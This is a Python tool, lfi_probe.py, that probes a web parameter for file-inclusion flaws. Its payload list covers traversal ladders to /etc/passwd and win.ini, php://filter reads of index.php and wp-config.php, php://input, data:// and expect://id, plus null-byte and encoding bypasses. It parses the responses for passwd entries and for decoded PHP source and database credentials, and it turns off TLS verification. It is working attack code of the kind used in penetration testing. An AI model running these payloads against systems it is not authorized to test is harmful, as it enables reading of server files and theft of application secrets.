#!/usr/bin/env python
"""lfi_probe.py — Local/Remote File Inclusion tester (Liffy/Kadimus style).

Tests file-inclusion THROUGH A PARAMETER (distinct from path_probe's static
existence checks): traversal ladders (Unix/Windows), PHP wrappers
(php://filter base64 source disclosure, data://, expect://, file://, php://input),
null-byte and encoding-variant bypasses. A positive signal is content from the
target file in the response body OR a base64 chunk that decodes to PHP source /
wp-config secrets (source disclosure). Every payload is compared against a benign
baseline AND a random-path baseline so a uniform WAF/JS-challenge shell or SPA
soft-404 catch-all (returns 200 for everything) cannot count as a hit.

Usage: python lfi_probe.py <url> --param <p> [--method GET|POST]
       [--data 'k=v&k2=v2'] [--concurrency 6] [--timeout 15]
"""
import argparse, base64, json, re, ssl, sys, time, urllib.error, urllib.parse, urllib.request
import concurrent.futures

# (label, payload, marker-family) — family tells the verifier what to grep for.
PAYLOADS = [
    # --- Unix traversal ladder ---
    ("trav_unix_4", "../../../../etc/passwd", "unix"),
    ("trav_unix_8", "../../../../../../../../etc/passwd", "unix"),
    ("trav_unix_abs", "/etc/passwd", "unix"),
    # --- Windows traversal ladder ---
    ("trav_win_4", "..\\..\\..\\..\\windows\\win.ini", "win"),
    ("trav_win_abs", "C:\\Windows\\win.ini", "win"),
    # --- PHP wrappers ---
    ("php_filter_index", "php://filter/convert.base64-encode/resource=index.php", "phpfilter"),
    ("php_filter_passwd", "php://filter/convert.base64-encode/resource=/etc/passwd", "phpfilter"),
    ("php_filter_wpconfig", "php://filter/convert.base64-encode/resource=wp-config.php", "phpfilter"),
    ("php_input", "php://input", "phpinput"),
    ("data_b64", "data://text/plain;base64," + base64.b64encode(b"redan_lfi_probe").decode(), "data"),
    ("expect_id", "expect://id", "expect"),
    ("file_uri", "file:///etc/passwd", "unix"),
    # --- Null-byte (legacy PHP <5.3.4) ---
    ("nullbyte_unix", "../../../../etc/passwd%00", "unix"),
    # --- Encoding variants ---
    ("trav_dotdot_slash", "....//....//....//etc/passwd", "unix"),
    ("pct_slash", "..%2f..%2f..%2f..%2fetc%2fpasswd", "unix"),
    ("pct_dot", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "unix"),
    ("double_enc", "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "unix"),
]

# Body markers that prove a real file (or source) was read, not a catch-all shell.
UNIX_MARKERS = [b"root:x:0:", b"bin/bash", b"bin/sh", b"/sbin/nologin", b"daemon:*:"]
WIN_MARKERS = [b"[boot loader]", b"[fonts]", b"[extensions]", b"for 16-bit app support"]
# PHP-source / secret markers (only meaningful AFTER base64-decoding a filter chunk).
# Normalized to bytes; deduped (no duplicate <?php as both bytes and str).
PHP_MARKERS = [b"<?php", b"<?=", b"DB_PASSWORD", b"DB_USER", b"DB_NAME", b"require_once", b"define("]

MARKER = "redan_lfi"  # canonical marker for the benign baseline value


def _request(url, param, value, method, data_tmpl, ctx, timeout):
    """Send one request with `value` in the param; return (status, body_bytes) or (status, b'')."""
    if method == "POST":
        post = data_tmpl.replace("__INJECT__", urllib.parse.quote(value, safe=""))
        req = urllib.request.Request(url, data=post.encode(), method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    else:
        sep = "&" if "?" in url else "?"
        req = urllib.request.Request(f"{url}{sep}{param}={urllib.parse.quote(value, safe='')}")
    req.add_header("User-Agent", "Mozilla/5.0 (compatible; LfiProbe/1.0)")
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            return r.status, r.read(50000)
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(50000)
        except Exception:
            return e.code, b""
    except Exception:
        return 0, b""


def _candidate_b64_chunks(body_bytes):
    """Yield every plausible base64 candidate in the body, plus trimmed prefix/suffix
    variants of each.

    php://filter emits the base64 of the file as one contiguous run, but in a real
    response that run is frequently flanked by base64-alphabet chars (HTML attrs,
    other tokens, CSS hashes) — the regex then greedily merges them into ONE corrupt
    chunk that decodes to garbage, so <?php / DB_PASSWORD never match. To defeat this
    we (a) consider ALL regex matches, not just the longest, and (b) for each match we
    also try shaving characters off the front and back (the merged-in flanking text),
    decoding each trim, because the legitimate payload sits inside the merged run.
    """
    if not body_bytes:
        return
    s = body_bytes.decode("utf-8", errors="replace")
    seen = set()
    chunks = re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", s)
    for chunk in chunks:
        # the whole match
        for cand in _trim_variants(chunk):
            if cand and cand not in seen:
                seen.add(cand)
                yield cand


def _trim_variants(chunk):
    """Yield the chunk plus prefix/suffix trims (shave up to 8 chars each side, one
    char at a time) so flanking base64-alphabet text merged into the run can be peeled
    away before decoding. Only yields candidates long enough to plausibly be a payload."""
    if not chunk:
        return
    yield chunk
    n = len(chunk)
    max_shave = min(8, n - 16)  # keep at least 16 chars after shaving
    for shave in range(1, max_shave + 1):
        yield chunk[shave:]            # peel prefix
        yield chunk[:n - shave]        # peel suffix
        yield chunk[shave:n - shave]   # peel both


def _find_php_source(body_bytes):
    """Find a base64 candidate whose DECODE contains a PHP/source marker.

    Iterates all candidate chunks (and their trimmed prefix/suffix variants), decodes
    each, and returns the decoded string of the first candidate whose decode contains
    a source/secret marker (<?php, DB_PASSWORD, DB_USER, define(), ...). Falls back to
    None. This is the opposite of the old greedy-longest-chunk heuristic, which merged
    flanking alphabet chars into one corrupt chunk and silently missed disclosure.
    """
    for cand in _candidate_b64_chunks(body_bytes):
        decoded = _decode_b64(cand)
        if decoded and _grep_php_markers(decoded):
            return decoded
    return None


def _decode_b64(chunk):
    """Best-effort base64 decode with padding repair; returns str or None."""
    if not chunk:
        return None
    try:
        pad = "=" * (-len(chunk) % 4)
        raw = base64.b64decode(chunk + pad, validate=False)
        return raw.decode("utf-8", errors="replace")
    except Exception:
        return None


def _grep_markers(body_bytes, family):
    """Return the matched marker string(s); distinguishes real content from a shell."""
    if not body_bytes:
        return []
    hits = []
    if family == "unix":
        for m in UNIX_MARKERS:
            if m in body_bytes:
                hits.append(m.decode())
    elif family == "win":
        for m in WIN_MARKERS:
            if m in body_bytes:
                hits.append(m.decode())
    return hits


def _grep_php_markers(decoded):
    """Grep decoded PHP source for source/secret markers. Returns list of matched marker strings."""
    if not decoded:
        return []
    hay = decoded.encode("utf-8", errors="replace") if isinstance(decoded, str) else decoded
    hits = []
    for m in PHP_MARKERS:  # all markers are bytes
        if m in hay:
            hits.append(m.decode("utf-8", errors="replace"))
    return hits


def test_payload(url, param, payload, family, method, data_tmpl, ctx, timeout,
                 baseline_body, rand_body):
    """Run one payload; classify against baselines to defeat the WAF/SPA catch-all."""
    status, body = _request(url, param, payload, method, data_tmpl, ctx, timeout)
    rec = {"payload": payload, "label": None, "family": family, "status": status,
           "body_len": len(body)}
    if not body:
        rec["error"] = "empty/non-http response"
        return rec

    # --- FALSE-POSITIVE GUARD: uniform-response detection ---
    # If the payload response is byte-identical (or near-identical length) to BOTH
    # the benign baseline AND the random-nonexistent-path baseline, this is a
    # WAF/JS-challenge shell or SPA catch-all returning 200 for everything — NOT a hit.
    uniform = (body == baseline_body) or (body == rand_body)
    near_uniform = False
    if baseline_body and rand_body:
        bl = len(baseline_body); rl = len(rand_body)
        if bl and rl and abs(len(body) - bl) < 20 and abs(len(body) - rl) < 20:
            near_uniform = True

    # --- Signal 1: plaintext file markers (unix/win) ---
    file_hits = _grep_markers(body, family) if family in ("unix", "win") else []
    if file_hits:
        # payload-INDUCED only: a marker already present in the benign/random baselines (a page that
        # STATICALLY renders passwd/win.ini-format text) is not an LFI — mirror ssti_probe's baseline
        # exclusion (`'49' not in baseline_text`). Without this a static-marker page = false CONFIRMED.
        _base_markers = set(_grep_markers(baseline_body, family)) | set(_grep_markers(rand_body, family))
        file_hits = [h for h in file_hits if h not in _base_markers]
    # --- Signal 2: base64 source disclosure (php filter) ---
    decoded = None
    php_hits = []
    decoded_snippet = None
    if family == "phpfilter":
        decoded = _find_php_source(body)
        if decoded:
            php_hits = _grep_php_markers(decoded)
            if php_hits:
                decoded_snippet = (decoded[:240] + "…") if len(decoded) > 240 else decoded
    # --- Signal 3: php://input / data:// reflected marker ---
    reflected_marker = False
    if family == "data":
        reflected_marker = b"redan_lfi_probe" in body

    real_hit = bool(file_hits or php_hits or reflected_marker)

    if uniform and not real_hit:
        rec["classified"] = "uniform-shell"
    elif near_uniform and not real_hit:
        rec["classified"] = "near-uniform"
    elif real_hit:
        rec["classified"] = "hit"
    else:
        rec["classified"] = "miss"

    rec["file_markers"] = file_hits
    rec["php_markers"] = php_hits
    if decoded_snippet:
        rec["decoded_snippet"] = decoded_snippet
    rec["reflected_marker"] = reflected_marker
    rec["real_hit"] = real_hit
    rec["_body"] = body  # transient; stripped before JSON output, used for reflection-LEAD check
    return rec


def main():
    ap = argparse.ArgumentParser(
        description="Local/Remote File Inclusion tester (Liffy/Kadimus style) — tests inclusion wrappers + traversal through a param, baseline-guarded against WAF/SPA catch-all shells.")
    ap.add_argument("url", help="target URL containing (or to receive) the injectable param")
    ap.add_argument("--param", required=True, help="parameter to inject the LFI payload into")
    ap.add_argument("--method", choices=["GET", "POST"], default="GET")
    ap.add_argument("--data", default="",
                    help="POST body template (use __INJECT__ as the placeholder for the param value)")
    ap.add_argument("--concurrency", type=int, default=6)
    ap.add_argument("--timeout", type=int, default=15)
    args = ap.parse_args()

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    data_tmpl = args.data or f"{args.param}=__INJECT__"

    # --- Baselines: benign value + random nonexistent path ---
    baseline_status, baseline_body = _request(
        args.url, args.param, MARKER, args.method, data_tmpl, ctx, args.timeout)
    rand_path = "zznotreal_%s_%d" % (MARKER, int(time.time()))
    rand_status, rand_body = _request(
        args.url, args.param, rand_path, args.method, data_tmpl, ctx, args.timeout)

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futures = {
            pool.submit(test_payload, args.url, args.param, p[1], p[2], args.method,
                        data_tmpl, ctx, args.timeout, baseline_body, rand_body): p[0]
            for p in PAYLOADS
        }
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            r["label"] = futures[fut]
            results.append(r)

    # Order: real hits first, then misses/shells.
    results.sort(key=lambda x: (not x.get("real_hit"), x.get("status", 0)))

    confirmed = [r for r in results if r.get("real_hit")]
    # Reflection-only LEADs: the wrapper payload (php://input, data://, expect://) is reflected
    # verbatim in the body but produced no file/source marker. Reflection is required — a payload
    # that isn't echoed back is not even a primitive, so check the payload substring is in the body
    # before promoting these families to a LEAD.
    reflection_leads = []
    for r in results:
        if r.get("real_hit"):
            continue
        if r.get("family") not in ("phpinput", "data", "expect"):
            continue
        if r.get("classified") == "uniform-shell":
            continue
        st = r.get("status", 0)
        if not st or st >= 500:
            continue
        body = r.get("_body")
        payload = r.get("payload", "")
        if body and payload and payload.encode("utf-8", errors="replace") in body:
            reflection_leads.append(r)

    if confirmed:
        # A source-disclosure hit (php markers) is stronger than a plain file-read; name it distinctly.
        source_disc = any(r.get("php_markers") for r in confirmed)
        # doctrine-lint: allow CONFIRMED — content-proof: the disclosed file/source BYTES (php markers /
        # target-file content) are present in the response, baseline-guarded. Reading the file IS the
        # demonstrated impact, not a single suggestive signal.
        verdict = "LFI CONFIRMED — source disclosure (PHP source / secrets via php://filter)" if source_disc else "LFI CONFIRMED — file read"
    elif reflection_leads:
        verdict = "LFI primitive (reflection only) — LEAD"
    else:
        verdict = "no LFI"

    out_confirmed = [
        {
            "payload": r["payload"],
            "label": r["label"],
            "signal": (r.get("php_markers") or r.get("file_markers")
                       or (["reflected marker"] if r.get("reflected_marker") else [])),
            "decoded_snippet": r.get("decoded_snippet"),
        }
        for r in confirmed
    ]

    # Strip the transient body bytes from each result before serializing.
    for r in results:
        r.pop("_body", None)

    print(json.dumps({
        "target": args.url,
        "param": args.param,
        "ok": True,
        "payloads_tested": len(results),
        "baseline_status": baseline_status,
        "randpath_status": rand_status,
        "shell_detected": baseline_body == rand_body,
        "confirmed": out_confirmed,
        "verdict": verdict,
        "results": results,
        "note": ("Real hit = target-file content or a base64 chunk decoding to PHP source / wp-config secrets, "
                 "with a benign+random-path baseline guard so a uniform WAF/JS-challenge or SPA catch-all 200 "
                 "cannot count. Reflection-only = a LEAD (needs independent confirmation)."),
    }, indent=2))


if __name__ == "__main__":
    main()
